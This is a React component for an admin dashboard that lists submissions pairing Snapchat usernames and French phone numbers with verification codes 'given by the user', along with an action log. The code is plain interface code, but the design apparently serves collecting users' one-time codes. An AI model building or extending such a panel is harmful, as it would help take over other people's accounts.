import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { ChevronDown, Copy, Check, KeyRound, CheckCircle2, XCircle, Clock } from "lucide-react";
import { base44 } from "@/api/base44Client";

const statusMeta = {
  code_valid: { label: "Validated", icon: CheckCircle2, cls: "bg-green-500/10 text-green-400 border-green-500/25" },
  code_wrong: { label: "Wrong number", icon: XCircle, cls: "bg-red-500/10 text-red-400 border-red-500/25" },
  code_expired: { label: "Expired", icon: Clock, cls: "bg-yellow-500/10 text-yellow-400 border-yellow-500/25" },
};

const operatorBadge = {
  SFR: "bg-red-500/10 text-red-400 border-red-500/25",
  Bouygues: "bg-blue-500/10 text-blue-400 border-blue-500/25",
  Orange: "bg-orange-500/10 text-orange-400 border-orange-500/25",
};

const actionLabels = {
  submitted: "Demande soumise",
  code_sent: "Code envoyé",
  code_verified: "Code validé",
  code_wrong: "Mauvais numéro",
  code_expired: "Code expiré",
  waiting_queue: "Mis en file d'attente",
  rejected: "Rejeté / Blacklisté",
};

const formatPhone = (tel) => String(tel || "").replace(/\D/g, "").replace(/(\d{2})(?=\d)/g, "$1 ").trim();

export default function HistoryItem({ sub, index }) {
  const [open, setOpen] = useState(false);
  const [logs, setLogs] = useState(null);
  const [loadingLogs, setLoadingLogs] = useState(false);
  const [copied, setCopied] = useState(false);

  const meta = statusMeta[sub.status] || statusMeta.code_valid;
  const Icon = meta.icon;

  const toggle = async () => {
    if (!open && logs === null) {
      setLoadingLogs(true);
      try {
        const res = await base44.entities.ActionLog.filter({ submission_id: sub.id });
        setLogs([...res].sort((a, b) => new Date(a.timestamp || a.created_date) - new Date(b.timestamp || b.created_date)));
      } catch {
        setLogs([]);
      }
      setLoadingLogs(false);
    }
    setOpen(!open);
  };

  const copyCode = async () => {
    try {
      await navigator.clipboard.writeText(sub.received_code || "");
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    } catch {}
  };

  const fmtTime = (ts) =>
    ts
      ? new Date(ts).toLocaleString("fr-FR", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" })
      : "—";

  return (
    <div className="rounded-xl border border-border bg-secondary/20 overflow-hidden">
      <button
        onClick={toggle}
        className={`w-full flex items-center gap-3 p-3 text-left transition-colors ${open ? "bg-secondary/40" : "hover:bg-secondary/30"}`}
      >
        <Icon className="w-4 h-4 text-muted-foreground flex-shrink-0" />
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-2">
            <span className="text-sm font-semibold text-foreground truncate">{sub.snapchat}</span>
            <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full border ${operatorBadge[sub.operateur]}`}>
              {sub.operateur}
            </span>
          </div>
          <p className="text-xs text-muted-foreground font-mono mt-0.5">{formatPhone(sub.telephone)}</p>
        </div>
        <span className={`text-[11px] font-semibold px-2.5 py-1 rounded-full border whitespace-nowrap ${meta.cls}`}>
          {meta.label}
        </span>
        <ChevronDown className={`w-4 h-4 text-muted-foreground flex-shrink-0 transition-transform ${open ? "rotate-180" : ""}`} />
      </button>

      <AnimatePresence initial={false}>
        {open && (
          <motion.div
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: "auto", opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            transition={{ duration: 0.2 }}
            className="border-t border-border"
          >
            <div className="p-4 space-y-4">
              {/* Code donné par l'utilisateur */}
              <div>
                <p className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground mb-1.5">
                  Code donné par l'utilisateur
                </p>
                {sub.received_code ? (
                  <div className="flex items-center justify-between rounded-lg bg-purple-500/10 border border-purple-500/20 px-3 py-2">
                    <span className="flex items-center gap-2 text-lg font-bold text-foreground font-mono tracking-[0.2em]">
                      <KeyRound className="w-4 h-4 text-purple-400" />
                      {sub.received_code}
                    </span>
                    <button
                      onClick={copyCode}
                      className="text-[11px] font-medium px-2.5 py-1 rounded-md bg-secondary/60 border border-border text-muted-foreground hover:text-foreground flex items-center gap-1"
                    >
                      {copied ? (
                        <>
                          <Check className="w-3 h-3" /> Copied
                        </>
                      ) : (
                        <>
                          <Copy className="w-3 h-3" /> Copy
                        </>
                      )}
                    </button>
                  </div>
                ) : (
                  <p className="text-xs text-muted-foreground italic">Aucun code reçu.</p>
                )}
              </div>

              {/* Historique des actions */}
              <div>
                <p className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground mb-2">
                  Actions effectuées
                </p>
                {loadingLogs ? (
                  <p className="text-xs text-muted-foreground">Chargement…</p>
                ) : logs && logs.length > 0 ? (
                  <div className="space-y-1.5">
                    {logs.map((log, i) => (
                      <div key={log.id || i} className="flex items-start gap-2.5 text-xs">
                        <div className="w-1.5 h-1.5 rounded-full bg-primary/60 mt-1.5 flex-shrink-0" />
                        <div className="flex-1 min-w-0">
                          <span className="text-foreground font-medium">{actionLabels[log.action] || log.action}</span>
                          {log.admin_user && (
                            <span className="text-muted-foreground"> · {log.admin_user}</span>
                          )}
                        </div>
                        <span className="text-muted-foreground/70 font-mono whitespace-nowrap">
                          {fmtTime(log.timestamp || log.created_date)}
                        </span>
                      </div>
                    ))}
                  </div>
                ) : (
                  <p className="text-xs text-muted-foreground italic">Aucune action enregistrée.</p>
                )}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}